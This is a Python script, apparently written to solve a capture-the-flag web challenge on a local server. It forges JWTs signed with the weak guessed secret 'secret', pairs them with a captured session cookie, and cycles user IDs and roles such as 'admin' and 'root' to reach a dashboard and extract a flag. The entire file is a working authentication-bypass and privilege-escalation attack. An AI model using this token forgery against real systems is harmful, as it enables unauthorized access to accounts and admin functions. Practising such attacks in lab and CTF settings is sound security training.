import requests
import re
import base64
import json
import hmac
import hashlib

base_url = "http://127.0.0.1:32883"

def create_jwt(user_id, user_type, username="test"):
    """Create a forged JWT"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "username": username,
        "user_id": user_id,
        "user_type": user_type
    }
    
    def base64url_encode(data):
        return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')
    
    encoded_header = base64url_encode(header)
    encoded_payload = base64url_encode(payload)
    message = f"{encoded_header}.{encoded_payload}"
    
    # Try with weak secret
    signature = hmac.new(b'secret', message.encode(), hashlib.sha256).digest()
    encoded_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return f"{message}.{encoded_signature}"

# Use the original working session cookie from context
working_session = 'eyJ1c2VyX2lkIjoxMDAzMn0.aVrymg.NNu-yKH1YrDsSG7Z3eGkZsI1CT0'

# Test different user_type values with different user_ids
test_cases = [
    (10032, 'admin'),
    (10032, 'superuser'),
    (10032, 'root'),
    (1, 'admin'),
    (0, 'admin'),
    (10031, 'admin'),
    (10033, 'admin'),
]

print(f"[*] Testing JWT manipulation with working session cookie\n")

for user_id, user_type in test_cases:
    jwt = create_jwt(user_id, user_type)
    
    session = requests.Session()
    session.cookies.set('auth_token', jwt)
    session.cookies.set('session', working_session)
    
    resp = session.get(f"{base_url}/dashboard", allow_redirects=False)
    
    print(f"\nuser_id={user_id}, user_type='{user_type}'")
    print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"  [!!! FLAG FOUND !!!] {flag_match.group(0)}")
        print(f"\nFull Response:")
        print(resp.text)
        break
    elif resp.status_code == 200:
        # Check if content changed
        if 'admin' in resp.text.lower() or len(resp.content) != 1847:
            print(f"  [INTERESTING] Content differs from baseline")
            print(f"  Response: {resp.text[:500]}")

print(f"\n[*] Test complete")

